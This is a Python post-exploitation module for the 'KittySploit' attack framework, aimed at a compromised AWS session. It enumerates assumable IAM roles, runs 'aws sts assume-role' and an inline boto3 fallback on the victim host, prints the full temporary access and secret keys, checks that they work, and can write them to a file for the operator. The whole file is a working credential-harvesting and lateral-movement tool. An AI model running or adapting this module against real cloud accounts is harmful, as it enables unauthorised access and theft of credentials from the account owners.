#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AWS Cross-Account Role Assumption Module
Author: KittySploit Team
Version: 1.0.0

This module attempts to assume roles in other AWS accounts (cross-account access).
"""

from kittysploit import *
import json
from core.output_handler import print_info, print_success, print_error, print_warning

class Module(Post):
    """Attempt to assume roles in other AWS accounts"""
    
    __info__ = {
        "name": "Cross-Account Role Assumption",
        "description": "Attempt to assume IAM roles in other AWS accounts",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "session_type": SessionType.AWS,
    }
    
    role_arn = OptString("", "Role ARN to assume (format: arn:aws:iam::ACCOUNT:role/ROLE_NAME)", True)
    session_name = OptString("kittysploit_session", "Session name for assumed role", False)
    duration = OptInteger(3600, "Session duration in seconds (900-43200)", False)
    enumerate_roles = OptBool(False, "Enumerate assumable roles in current account", False)
    output_file = OptString("", "Output file to save credentials (JSON format)", False)
    
    def run(self):
        """Run the cross-account role assumption"""
        try:
            results = {}
            
            print_info("Starting cross-account role assumption...")
            print_info("=" * 80)
            
            # Enumerate assumable roles if requested
            if self.enumerate_roles.value:
                print_info("\n[1] Enumerating assumable roles...")
                roles = self._enumerate_assumable_roles()
                if roles:
                    results['assumable_roles'] = roles
                    print_success(f"Found {len(roles)} assumable roles")
                    for role in roles[:10]:
                        print_info(f"  - {role.get('RoleName', 'Unknown')} ({role.get('Arn', 'Unknown')})")
                    if len(roles) > 10:
                        print_info(f"  ... and {len(roles) - 10} more")
                else:
                    print_info("No assumable roles found")
            
            # Assume role
            role_arn = self.role_arn.value
            if role_arn:
                print_info(f"\n[2] Attempting to assume role: {role_arn}")
                credentials = self._assume_role(role_arn, self.session_name.value, self.duration.value)
                
                if credentials:
                    results['assumed_role'] = {
                        'role_arn': role_arn,
                        'credentials': credentials
                    }
                    print_success("Successfully assumed role!")
                    print_warning("⚠️  TEMPORARY CREDENTIALS (valid for limited time):")
                    print_info(f"  Access Key ID: {credentials.get('AccessKeyId')}")
                    print_info(f"  Secret Access Key: {credentials.get('SecretAccessKey')}")
                    print_info(f"  Session Token: {credentials.get('SessionToken', '')[:20]}...")
                    print_info(f"  Expiration: {credentials.get('Expiration', 'Unknown')}")
                    
                    # Test new credentials
                    print_info("\n[3] Testing assumed role credentials...")
                    identity = self._test_credentials(credentials)
                    if identity:
                        results['new_identity'] = identity
                        print_success(f"New identity: {identity.get('Arn', 'Unknown')}")
                else:
                    print_error("Failed to assume role (may lack permissions or role doesn't exist)")
            
            # Summary
            print_info("\n" + "=" * 80)
            print_info("ASSUMPTION SUMMARY")
            print_info("=" * 80)
            
            if results.get('assumed_role'):
                print_success("Role assumption successful")
                print_warning("⚠️  Use these credentials before they expire!")
            else:
                print_warning("Role assumption failed")
            
            # Save to file if requested
            if self.output_file.value and results:
                try:
                    with open(self.output_file.value, 'w') as f:
                        json.dump(results, f, indent=2, default=str)
                    print_success(f"Results saved to {self.output_file.value}")
                except Exception as e:
                    print_error(f"Failed to save results: {e}")
            
            return True
            
        except Exception as e:
            print_error(f"Error during role assumption: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def _enumerate_assumable_roles(self):
        """Enumerate roles that can be assumed"""
        # List all roles
        cmd = "aws iam list-roles 2>/dev/null"
        result = self.cmd_execute(cmd)
        
        if not result:
            return []
        
        try:
            data = json.loads(result)
            roles = data.get('Roles', [])
            
            # Filter roles that can be assumed (check trust policy)
            assumable = []
            for role in roles:
                trust_policy = role.get('AssumeRolePolicyDocument', {})
                if isinstance(trust_policy, str):
                    try:
                        trust_policy = json.loads(trust_policy)
                    except:
                        continue
                
                statements = trust_policy.get('Statement', [])
                for stmt in statements:
                    if stmt.get('Effect') == 'Allow':
                        principal = stmt.get('Principal', {})
                        if 'AWS' in principal or 'Service' in principal:
                            assumable.append(role)
                            break
            
            return assumable
        except:
            pass
        
        return []
    
    def _assume_role(self, role_arn, session_name, duration):
        """Assume an IAM role"""
        cmd = f"aws sts assume-role --role-arn {role_arn} --role-session-name {session_name} --duration-seconds {duration} 2>&1"
        result = self.cmd_execute(cmd)
        
        if result:
            try:
                data = json.loads(result)
                creds = data.get('Credentials', {})
                if creds:
                    return {
                        'AccessKeyId': creds.get('AccessKeyId'),
                        'SecretAccessKey': creds.get('SecretAccessKey'),
                        'SessionToken': creds.get('SessionToken'),
                        'Expiration': str(creds.get('Expiration', ''))
                    }
            except:
                pass
        
        # Try Python boto3
        python_cmd = f"""
python3 -c "
import boto3, json
try:
    sts = boto3.client('sts')
    response = sts.assume_role(
        RoleArn='{role_arn}',
        RoleSessionName='{session_name}',
        DurationSeconds={duration}
    )
    creds = response.get('Credentials', {{}})
    print(json.dumps({{
        'AccessKeyId': creds.get('AccessKeyId'),
        'SecretAccessKey': creds.get('SecretAccessKey'),
        'SessionToken': creds.get('SessionToken'),
        'Expiration': str(creds.get('Expiration', ''))
    }}))
except Exception as e:
    print('ERROR:', str(e))
" 2>/dev/null
"""
        result = self.cmd_execute(python_cmd)
        if result and 'ERROR' not in result:
            try:
                return json.loads(result)
            except:
                pass
        return None
    
    def _test_credentials(self, credentials):
        """Test assumed role credentials"""
        python_cmd = f"""
python3 -c "
import boto3, json
try:
    sts = boto3.client(
        'sts',
        aws_access_key_id='{credentials.get('AccessKeyId')}',
        aws_secret_access_key='{credentials.get('SecretAccessKey')}',
        aws_session_token='{credentials.get('SessionToken')}'
    )
    identity = sts.get_caller_identity()
    print(json.dumps(identity))
except Exception as e:
    print('ERROR:', str(e))
" 2>/dev/null
"""
        result = self.cmd_execute(python_cmd)
        if result and 'ERROR' not in result:
            try:
                return json.loads(result)
            except:
                pass
        return None


